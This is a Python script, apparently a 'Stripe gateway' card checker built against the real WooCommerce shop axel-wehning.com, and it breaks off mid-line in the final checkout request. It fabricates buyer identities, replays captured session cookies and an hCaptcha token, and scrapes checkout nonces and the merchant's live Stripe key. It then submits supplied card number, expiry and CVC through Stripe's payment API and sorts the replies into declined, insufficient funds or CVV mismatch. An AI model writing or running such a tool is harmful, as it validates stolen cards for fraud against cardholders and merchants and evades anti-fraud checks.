# ==================== gatet.py (للموقع الجديد Axel-Wehning - Stripe Gateway) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_data():
    """توليد بيانات عنوان صالح"""
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia',
                   'John', 'Jane', 'Michael', 'Sarah', 'David', 'Laura']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis',
                  'Caril', 'Hatleyb', 'Payne', 'Betran']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    countries = ['US', 'GB', 'CA', 'AU', 'DE', 'FR', 'CH']
    us_states = ['CA', 'TX', 'FL', 'NY', 'IL', 'PA', 'OH', 'GA', 'NC', 'MI']
    us_cities = ['Los Angeles', 'Houston', 'Chicago', 'Brooklyn', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin',
                 'New York', 'Miami', 'Seattle', 'Denver', 'Boston']
    us_postcodes = ['90001', '77001', '60601', '11201', '85001', '19101', '78201', '92101', '75201', '73301', '10001']
    us_phones = ['2135551234', '7135551234', '3125551234', '7185551234', '6025551234', '2155551234', '12038783117']
    us_addresses = ['1 Rowe Ave', '123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Street', '654 Maple Drive']
    
    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', '@gmail.com']
    email_domain = random.choice(email_domains)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
        'phone': random.choice(us_phones),
        'address_1': random.choice(us_addresses),
        'city': random.choice(us_cities),
        'state': random.choice(us_states),
        'country': random.choice(countries),
        'postcode': random.choice(us_postcodes),
        'company': f"{first}'s {random.choice(['Auto', 'Parts', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
    }

def ch(ccx):
    print("\n" + "="*70)
    print("[DEBUG] STARTING NEW CHECK - Axel-Wehning (Stripe Gateway)")
    print("="*70)
    
    ccx = ccx.strip()
    n = ccx.split("|")[0].replace(' ', '')
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    user = generate_user_agent()
    fake_data = generate_valid_data()
    session_id = str(uuid.uuid4())
    correlation_id = str(uuid.uuid4())[:24]
    r = requests.session()
    
    print(f"[1/6] Using User-Agent: {user[:50]}...")
    print(f"[1/6] Generated fake data: {fake_data['first_name']} {fake_data['last_name']}, {fake_data['email']}")
    
    # ================ 1. ADD TO CART ================
    print("\n[2/6] Adding product to cart...")
    
    cookies_add = {
        'wp_woocommerce_session_f530ed8d3f6c7e8d6f2a0312f33aa828': 't_01921a35e9efef72700618cfea81a8%7C1779397372%7C1779310972%7C%24generic%24W5Qg3PKSyVPbtDmzjvJnIk9vwqDSLD4_pOeKmsPU',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'woosw_key': 'NX0Y28',
        'tmc_cookie_popup_status': 'false',
        'tk_ai': 'nkmVrhFEAG48I45AL6Wi5lXJ',
    }
    
    headers_add = {
        'authority': 'axel-wehning.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://axel-wehning.com',
        'referer': 'https://axel-wehning.com/shop',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_add = {'wc-ajax': 'add_to_cart'}
    
    data_add = {
        'success_message': '“Frederic Mompou - Canción y Danza V - for four guitars” has been added to your cart',
        'product_sku': '',
        'product_id': '1039',
        'quantity': '1',
    }
    
    response = r.post('https://axel-wehning.com/', params=params_add, headers=headers_add, data=data_add, cookies=cookies_add)
    print(f"[2/6] Add to cart status: {response.status_code}")
    print(f"[2/6] Add to cart response: {response.text[:200]}")
    
    if response.status_code != 200:
        return f'ADD_TO_CART_FAILED'
    
    # ================ 2. CHECKOUT PAGE ================
    print("\n[3/6] Accessing checkout page...")
    
    cookies_checkout = {
        'wp_woocommerce_session_f530ed8d3f6c7e8d6f2a0312f33aa828': 't_01921a35e9efef72700618cfea81a8%7C1779397372%7C1779310972%7C%24generic%24W5Qg3PKSyVPbtDmzjvJnIk9vwqDSLD4_pOeKmsPU',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'woosw_key': 'NX0Y28',
        'tmc_cookie_popup_status': 'false',
        'tk_ai': 'nkmVrhFEAG48I45AL6Wi5lXJ',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': 'aedb6e9af5d604452d61d5436a3e95eb',
        '_ga_P1TMENP11R': 'GS2.1.s1779224582$o1$g0$t1779224596$j46$l0$h0',
    }
    
    headers_checkout = {
        'authority': 'axel-wehning.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://axel-wehning.com/shop',
        'user-agent': user,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
    }
    
    response = r.get('https://axel-wehning.com/checkout', cookies=cookies_checkout, headers=headers_checkout)
    print(f"[3/6] Checkout page status: {response.status_code}")
    
    if response.status_code != 200:
        return f'CHECKOUT_PAGE_FAILED'
    
    # ================ 3. EXTRACT NONCES ================
    print("\n[4/6] Extracting nonces...")
    
    sec = re.search(r'wc-ajax=update_order_review[^"]*security[^"]*"?\s*value="([^"]+)"', response.text)
    if not sec:
        sec = re.search(r'update_order_review_nonce":"([^"]+)"', response.text)
    if sec:
        sec = sec.group(1)
        print(f"[4/6] Found update_order_review nonce: {sec[:20]}...")
    else:
        sec = 'b04b1ec3fc'
        print("[4/6] WARNING: Using fallback nonce")
    
    check_nonce = re.search(r'woocommerce-process-checkout-nonce[^"]*"?\s*value="([^"]+)"', response.text)
    if not check_nonce:
        check_nonce = re.search(r'woocommerce-process-checkout-nonce":"([^"]+)"', response.text)
    if check_nonce:
        check_nonce = check_nonce.group(1)
        print(f"[4/6] Found checkout nonce: {check_nonce[:20]}...")
    else:
        check_nonce = '9afa35cd31'
        print("[4/6] WARNING: Using fallback checkout nonce")
    
    # استخراج Stripe key
    stripe_key_match = re.search(r'pk_live_[a-zA-Z0-9]+', response.text)
    if stripe_key_match:
        stripe_key = stripe_key_match.group(0)
        print(f"[4/6] Found Stripe key: {stripe_key[:20]}...")
    else:
        stripe_key = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
        print("[4/6] Using fallback Stripe key")
    
    # ================ 4. UPDATE ORDER REVIEW ================
    print("\n[5/6] Updating order review...")
    
    cookies_update = {
        'wp_woocommerce_session_f530ed8d3f6c7e8d6f2a0312f33aa828': 't_01921a35e9efef72700618cfea81a8%7C1779397372%7C1779310972%7C%24generic%24W5Qg3PKSyVPbtDmzjvJnIk9vwqDSLD4_pOeKmsPU',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'woosw_key': 'NX0Y28',
        'tmc_cookie_popup_status': 'false',
        'tk_ai': 'nkmVrhFEAG48I45AL6Wi5lXJ',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': 'aedb6e9af5d604452d61d5436a3e95eb',
        '_ga_P1TMENP11R': 'GS2.1.s1779224582$o1$g1$t1779224626$j16$l0$h0',
    }
    
    headers_update = {
        'authority': 'axel-wehning.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://axel-wehning.com',
        'referer': 'https://axel-wehning.com/checkout',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_update = {'wc-ajax': 'update_order_review'}
    
    data_update = f'security={sec}&payment_method=woocommerce_payments&country={fake_data["country"]}&state={fake_data["state"]}&postcode=&city=&address=&address_2=&s_country={fake_data["country"]}&s_state={fake_data["state"]}&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Faxel-wehning.com%252Fcart%26wc_order_attribution_session_start_time%3D2026-05-19%252021%253A02%253A57%26wc_order_attribution_session_pages%3D3%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_first_name%3D%26billing_last_name%3D%26billing_company%3D%26billing_country%3D{fake_data["country"]}%26billing_address_1%3D%26billing_address_2%3D%26billing_city%3D%26billing_state%3D{fake_data["state"]}%26billing_postcode%3D%26billing_phone%3D%26billing_email%3D%26order_comments%3D%26payment_method%3Dwoocommerce_payments%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check_nonce}%26_wp_http_referer%3D%252Fcheckout'
    
    response = r.post('https://axel-wehning.com/', params=params_update, headers=headers_update, data=data_update, cookies=cookies_update)
    print(f"[5/6] Update order review status: {response.status_code}")
    print(f"[5/6] Update order review response: {response.text[:300]}")
    
    # ================ 5. CREATE STRIPE PAYMENT METHOD (Tokenization) ================
    print("\n[6/6] Creating Stripe payment method...")
    
    # توليد client_session_id جديد
    client_session_id = str(uuid.uuid4())
    elements_session_id = f"elements_session_{random.randint(10, 99)}Vz{random.randint(1, 9)}jU{random.randint(1, 9)}QUy"
    elements_session_config_id = str(uuid.uuid4())
    guid = f"{str(uuid.uuid4()).replace('-', '')[:24]}"
    muid = f"{str(uuid.uuid4()).replace('-', '')[:26]}"
    sid = f"{str(uuid.uuid4()).replace('-', '')[:28]}"
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    # تنسيق رقم البطاقة مع مسافات كل 4 أرقام (لـ Stripe)
    formatted_card = ' '.join([n[i:i+4] for i in range(0, len(n), 4)])
    
    data_stripe = f'billing_details[name]={fake_data["first_name"]}+{fake_data["last_name"]}&billing_details[email]={fake_data["email"]}&billing_details[phone]={fake_data["phone"]}&billing_details[address][city]={fake_data["city"]}&billing_details[address][country]=US&billing_details[address][line1]={fake_data["address_1"].replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={fake_data["postcode"]}&billing_details[address][state]={fake_data["state"]}&type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy[-2:]}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2Fe27e2486c8%3B+stripe-js-v3%2Fe27e2486c8%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Faxel-wehning.com&time_on_page=98523&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]={elements_session_id}&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={stripe_key}&_stripe_account=acct_1RlCITFowUFLNbjU&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzc5MjI0NzgwLCJjZGF0YSI6IklhSlR4WHVIelFnbCtGWkdKMmUvWS81V0x3SGI3WHF2V0hiMmY4L1ZGazBjVUo1N050OEVVMlExVzdWckdOOEFKK1JXRjlLenI1YWhPUzEySXZuSzlYdXhpemdJejNYOFJPWEJicWUyTFhrSWlSVFpPeGdNaVk1V1JsNG1mMFlRTi9Vd0ZTTmhBQWJDV3lFSUFRd0pEd2pkcUFZaG1LOElCL0t0QVFaNDBFODg2U1laalNhSXJHODJteXkydU5aUTBnRDZXYjU4cEtzdloxajlUK1JJWTBoNU1zd1JzSmZzWDdXbHg2bExtRkp6ZzE0VXlFTE5VOWtaSlNwNWZ6VndvSUNDQXBpTGVOVm1BQ2hDcDZEaVN2dkwxSWcrNDJZU3QwQVM0RE9WK21kSnlOZHBEbWZ4QVFFTzFlejIrSCsvNmFZZG4wSEFBczhXUXBnU1Q3dXVXdHNVM1h4UUZpOGJrckFHaXkvS3R0VT0vckVTQ0VHQ3BBQ3hES1J5IiwicGFzc2tleSI6IjB5Y01IV0w5cGxxSHE4SkVHTFZoVTlEVE55Ynlzd3NPY01HbDc0Mi90SWRaSERrSDdyUGp2WWE0eDZrTW84UU9aTkhhZDB6N3RjbkVXU3BPRS9PbEJVMWxjUzBnSTQ2L2FZWmIzcFE2djZ4WENGUHEzU2c0NXlncTZvVkZ0RjFPU1pxTEpUMXBJN2hyWU52WUZ5emtTYmZwK2pwVTEwdW5Rb21WSFo5bXZRYTM2dHArQ2lpUlZKdm9rRWl3N3ZTZnhpS3hKd3JFVzlWcXJlTnkybyswZVNIMUJ2aHA4cHpSdG53ZUorMTRuSnFxSVpjb09RWjFNV2lWUUZZNENxbmdWTVpPUzJrSTk1QVc3RWFqRVdIVWM5ejJPZXNaaStzN2gwOS9ta3dHa0J0MUNCcTdESitENHY5RkE5c1VxZ3Q3ZFJJQVBNdGdhRUdmdi9jb3VpeXFBdE1IRDlwMEQzcXgyeXFXWWZUMnY4ZkMrcCtUeUZJYTlMUWFvNXBEUDY0QXJVNHBGVFpVakpOZHh4T2NBSUZENHhoc29BcTI3Q3poVEUyWUNBdGtHTGRxbWsrTUtrQVVQWGYrUGROWFVWblFsSFlRaTc4NFJoZjhQeVU1eGMvN0pFbVNsbG1WejZMWi92RUlZNzJkaVJUcXpZUndPQlljcFdZZ29pL2tuMGs0ZUZkTk1YUHVONXVLV0FlYWU4NDhHbkZPL0VNa3dKOVV1d1VGZ1dJZ3NpYXk5OW5nS2JNa3orWWtPY1JENHd3YVlIcUY2aWxlMzRQTnJOWWZtcFJocXRPU21kUGRNb3JwK082SkRURW1ORjNKeE1XbEwzeUYvSk9TYjZEcVZSclBHZzVyL1k0a08xOEhrcytVKzdSdnNrNXJBeC9mMlBnTTNiK09kVFZ5VS9tWW5Bc1Y3Z2pER2JBOVMxNHhJNnl1aWNMNlAxOU9MRkJMVXNSOXp6QUhFVXdtRlFtTHlQbk83WTU3NFcyT29BZnhUakpEdHM2emF0ZGxrZEcrV0FDV1RsNDI4L212OUg4bEpkbGMyV3hmV1BsYjhvSlRhUk13ek4wd2FHbHB5dnhoSk5RMkFLUzNBYnF3dVJRWmt4a1NJWndPdFBtbmpSZmRRZll6NXJMYVUxWWFhcGlrQVlaYVBFdHBoZkNPTmEvTjU0ZlY1bWFGY0ZqQ3dna1dTRTZldnRxell2ZDNkWlUvNnNYL3NWR1JkSUlWSnJ2TXQzTUFXRyt2UzRIdjhEVzkzZTVwV1djSXQ1cm9WMllpY3gzRTNpVm9VSnVZdUVxWE5Ubi91VW1xTEFtWStscUJpK2ZKK0pnNmk3cHRwaUJKaXF5KzZ0MmIyVCtlaUxzYmVBQXZTSHAvd3h5MG4xVVpmRXFEU0liay9ydy9XaHBvWEtXM0lIYVQ0NTdqQnpnL1BscDdQblVMdDh1cXBpQjdvUWhZeHhTSWovRzUwK3hUWWZQWWdubk1DQ0ZhQVZPOGJBK0IvcUZtWVQ3OGtENEp6RFVWNVF2cVRPZk5TT0E1S2NjRWw2T0hab0w3VCtSakVMaXpVU2hOa2Y2OW5uQy9zMUlnYmFSamJTaDdtbzNlU1ZCZkNjWmp5V0crajcweEU2c1hpTFF1QXNqbFNiWXhxUk00Y3NSc0hKaVdoMFQvTEh0TjQvM2EvemcvcEYxa3dtOXZqK3ZzVW9jS0tRZ3ZaQXI0QW1WaGhvaW4wUTQ4U0hhVzlZTk1HUHhURUlsb0VYTS9WREt2dnZJWUxiaUxCalI1RUVha2Y4NVMyS0tEZ0V6U0JaRVFjTWQ4dlcvSWhRZ2xvWVNwZG9uamtUZXAwMEg1MFliSUFPY1BPOVlaN01TbUw4Qmx3T2V5MHo3YlVYOTg4Y3ZGakRIODJkam1xcktZVUJCZ0h3RjBFQk1EOE14dGJtQzM1SmZXcjViTlRsN1ZIMFBzMkI1UGVEOFRIOHhoa2E1L20zd2VPUDk2YW9OWEFqQ0FTU2JoZ3VxTHJ4Wkl5bVY5bWQyVC9KbVQrVzZHYU4zR0ZiR0d6NlRCcHd6S0NiWnJteGpxUllRSFFTQ0lXRHUwbmJVMEFoYlhlKy9OaUpOaGs5bGRGTXd1VWJ0UXJncUpEN3RLZVVhSlViT0J1ZWVPQmdhOVJvWGFGcU0vMHkvV0s1VnByaXVuTDgreG1odWVPU2dJbkpOTm5JWVJIMU9vb2hkVE1zL041blYyMDUveUYvQ3QwYUh0VzBwMldjL2ppSHAwSkNIbitxdDdScDJsOHdnQkJkN2ttWlA4NGZndm93Vk4wVVUzS3JyejNvdlAwdUVUZmJzdUFuMHRQd0VZTnR2cEJPMFRUZndnTXNMVDV3RHlEeVpDc255ckR3OUNZRmRlbmNidlhqVW1nbEhGTk9LejUxS1pScUx5KzJJVlhqSmhQa2ZYUms1bzhBYWFkV0ZnMTUrMkxQMC9LOWh0MDV0SXBtRW1sclNKcjdjZUdGTFBtWDU3MEVxWFZ3SUtiR0xnNGIxQ3UvTW82U3hONktPWm9xeHdtLzg3Vkt0TWM5R1ZxZ3AyT0xWUXdWYk5KdVhTRFpmb0VLaU16VGJJRk9TRk1TcC9tdXZISUtQZUFKdEY5akM2Wkg1ak1ydzJ4Z0c1aUdyNVp4b29ZL2d2eEd2VzFJTkt4K1hVN29XNWE2dUpZSXk2Q2dOT1crcEtIRVFhZzlmait0T3RIdHlpVW1uci82amIxVUE2UUhqMWN6cVpDcVphOGpGeVZtNzJReDNUSGdmQldPd2pxcS9SNUZzWXlTSTdPT0dkdHlHMGZuMHVrYmtOKzBQakFnVytrYk8rWENoZUZHU0FCZ0lQMmpQaGRRdmtiR2ZvREROUWVjQUxGRlM2ejE4YSIsImtyIjoiNjc5YmY5OSIsInNoYXJkX2lkIjo4MzM0NDA4OTd9.LRWfZj7xHamIEPosTUzpCprTSaNe1WwmVYRkVMvWYVE'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
    print(f"[6/6] Stripe payment method status: {response.status_code}")
    
    try:
        payment_method_data = response.json()
        payment_method_id = payment_method_data.get('id')
        print(f"[6/6] Got payment method ID: {payment_method_id}")
    except Exception as e:
        print(f"[6/6] Failed to get payment method: {e}")
        print(f"[6/6] Response: {response.text[:200]}")
        return f'STRIPE_TOKENIZATION_FAILED'
    
    if not payment_method_id:
        # محاولة استخراج الخطأ من Stripe
        error_msg = response.text.lower()
        if 'your card number is incorrect' in error_msg:
            return 'INVALID CARD NUMBER'
        elif 'insufficient funds' in error_msg:
            return 'INSUFFICIENT FUNDS'
        elif 'your card has been declined' in error_msg:
            return 'DECLINED'
        elif 'expired' in error_msg:
            return 'EXPIRED CARD'
        elif 'cvv' in error_msg:
            return 'CVV MISMATCH'
        else:
            return f'STRIPE_ERROR: {response.text[:100]}'
    
    # ================ 6. FINAL CHECKOUT ================
    print("\n[7/7] Processing final checkout...")
    
    cookies_final = {
        'wp_woocommerce_session_f530ed8d3f6c7e8d6f2a0312f33aa828': 't_01921a35e9efef72700618cfea81a8%7C1779397372%7C1779310972%7C%24generic%24W5Qg3PKSyVPbtDmzjvJnIk9vwqDSLD4_pOeKmsPU',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-19%2021%3A02%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Faxel-wehning.com%2Fcart%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'woosw_key': 'NX0Y28',
        'tmc_cookie_popup_status': 'false',
        'tk_ai': 'nkmVrhFEAG48I45AL6Wi5lXJ',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': 'aedb6e9af5d604452d61d5436a3e95eb',
        'tk_qs': '',
        '__ssid': '6d020900-1381-4e6a-bb96-d848bcc24afa',
        '__stripe_mid': muid,
        '__stripe_sid': sid,
        '_ga_P1TMENP11R': 'GS2.1.s1779224582$o1$g1$t1779224688$j60$l0$h0',
    }
    
    headers_final = {
        'authority': 'axel-wehning.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://axel-wehning.com',
        'referer': 'https://axel-wehning.com/checkout',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_final = {'wc-ajax': 'checkout'}
    
    # توليد fraud prevention token (hcaptcha token from Stripe)
    fraud_token = 'f3929bb1eeae85f5290c6aa670f3fd2a'
    
    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Faxel-wehning.com%2Fcart&wc_order_attribution_session_start_time=2026-05-19+21%3A02%3A57&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_first_name={fake_data["first_name"]}&billing_last_name={fake_data["last_name"]}&billing_company=&billing_country=US&billing_address_1={fake_data["address_1"].replace(" ", 